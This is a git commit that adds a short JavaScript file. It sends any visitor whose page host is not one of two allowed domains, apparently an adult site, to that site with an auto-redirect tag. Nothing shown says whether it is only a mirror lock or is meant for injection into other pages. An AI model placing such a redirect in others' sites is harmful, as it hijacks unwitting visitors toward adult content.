15cbf17a1392de74efc3f9688a1b59842d68e0e8
Galuhput96 <91706295+Galuhput96@users.noreply.github.com>
2025-05-28 02:12:40 +0700

    Create anu.js

---
+++ anu.js
@@ -0,0 +1,4 @@
+const allowed = ["tv1.igo-bokep.icu", "www.igo-bokep.icu"];
+if (!allowed.includes(window.location.host)) {
+  window.location.href = "https://tv1.igo-bokep.icu/?utm_source=redirect_auto";
+}
